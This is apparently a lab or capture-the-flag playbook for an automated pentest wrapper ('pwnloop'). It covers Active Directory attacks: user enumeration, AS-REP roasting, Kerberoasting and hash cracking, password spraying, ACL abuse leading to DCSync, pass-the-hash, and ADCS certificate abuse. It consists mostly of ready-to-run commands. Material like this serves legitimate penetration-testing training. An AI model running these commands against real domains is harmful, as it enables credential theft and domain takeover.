# Active Directory

## Without credentials

```bash
pwnloop x "nxc smb $T"                                   # domain name, hostname, signing
pwnloop x "nxc smb $T -u '' -p '' --users --shares"
pwnloop x "nxc smb $T -u guest -p '' --rid-brute 4000"
pwnloop x "impacket-lookupsid anonymous@$T"              # user enumeration via SID bruteforce
pwnloop x "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='MACHINE.HTB',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $T"
```

Time skew breaks Kerberos. Sync to the DC if you see `KRB_AP_ERR_SKEW`:
```bash
pwnloop x "ntpdate -u $T"          # ntpsec-ntpdate; the container has NET_ADMIN
pwnloop x "date -s \"\$(date -d \"\$(rdate -p -n $T)\" -u +'%Y-%m-%d %H:%M:%S')\""   # fallback
```
If neither works, wrap the impacket call in `faketime` rather than fighting the
container clock.

## AS-REP roasting (no creds needed, just usernames)

```bash
pwnloop x "impacket-GetNPUsers machine.htb/ -usersfile users.txt -dc-ip $T -no-pass -format hashcat -outputfile /engagements/$NAME/loot/asrep.hash"
pwnloop x "john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/asrep.hash"
```
Accounts with "do not require Kerberos preauthentication" hand you a crackable
hash for free.

## With any domain credential

```bash
pwnloop x "nxc smb $T -u user -p pass --shares --users --groups --pass-pol"
pwnloop x "nxc smb $T -u user -p pass -M spider_plus"
pwnloop x "impacket-GetUserSPNs machine.htb/user:pass -dc-ip $T -request -outputfile /engagements/$NAME/loot/kerberoast.hash"
pwnloop x "john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/kerberoast.hash"
```
Kerberoastable service accounts with weak passwords are the classic path from
"any user" to "privileged user".

Password spraying — one password, every user, watching the lockout policy:
```bash
pwnloop x "nxc smb $T -u users.txt -p 'Password123' --continue-on-success"
```

## Enumerating ACL paths without a BloodHound GUI

```bash
pwnloop x "pip install bloodhound && bloodhound-python -u user -p pass -d machine.htb -dc dc.machine.htb -c All -ns $T"
```
That produces JSON you can grep directly for the interesting edges when no GUI
is available:
```bash
pwnloop x "grep -i 'GenericAll\|GenericWrite\|WriteDacl\|WriteOwner\|ForceChangePassword\|AddMember' /engagements/$NAME/loot/*.json | head -40"
```

### Two gotchas that waste time on a live DC

**A Windows access token is fixed at logon.** If you add yourself to a group or
grant yourself a right, the session you already hold does **not** gain it — you
need a fresh logon, which on Kerberos means a fresh TGT. The most reliable way to
act on a just-granted right is from Linux with impacket/`net rpc`, each command
re-authenticating with the password, rather than trying to use a WinRM/PowerShell
session that started before the change.

**Lab DCs run a reset job** that reverts state (group membership, ACLs) every few
minutes. Do not add a group, wander off to enumerate, and come back — the change
will be gone. Chain add + grant + use in one window:

```bash
# one window, each step re-auths fresh — beats both the token and the reset job
nxc x "net rpc group addmem 'Exchange Windows Permissions' myuser -U 'dom/myuser%pass' -S $T"
impacket-dacledit -action write -rights DCSync -principal myuser \
  -target-dn 'DC=dom,DC=local' 'dom/myuser:pass' -dc-ip $T
impacket-secretsdump 'dom/myuser:pass'@$T -just-dc-user Administrator
```

Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift);
if you must use it, `ntpdate -u $T` first, in the *same* invocation as the action.

Common ACL abuses:
- `ForceChangePassword` on a user → reset their password with `net rpc password`
- `GenericAll` on a user → targeted Kerberoast (add an SPN) or password reset
- `GenericAll`/`GenericWrite` on a computer → resource-based constrained
  delegation, then impersonate an admin
- `AddMember` on a group → add yourself, inherit its rights
- `WriteDacl` on the domain → grant yourself DCSync

```bash
pwnloop x "net rpc password 'target-user' 'NewPass123!' -U 'machine.htb'/'you'%'yourpass' -S $T"
```

## DCSync and the domain

```bash
pwnloop x "impacket-secretsdump machine.htb/user:pass@$T -just-dc"
pwnloop x "impacket-psexec machine.htb/Administrator@$T -hashes :<nthash>"
pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"
```

## Certificate services (ADCS)

Vulnerable templates are a frequent modern path:
```bash
pwnloop x "certipy find -u user@machine.htb -p pass -dc-ip $T -vulnerable -stdout"
pwnloop x "certipy req -u user@machine.htb -p pass -ca CA-NAME -template VulnTemplate -upn administrator@machine.htb"
pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T"
```
ESC1 (enrollee-supplied subject) and ESC8 (NTLM relay to the web enrollment
endpoint) are the ones most often planted in labs.
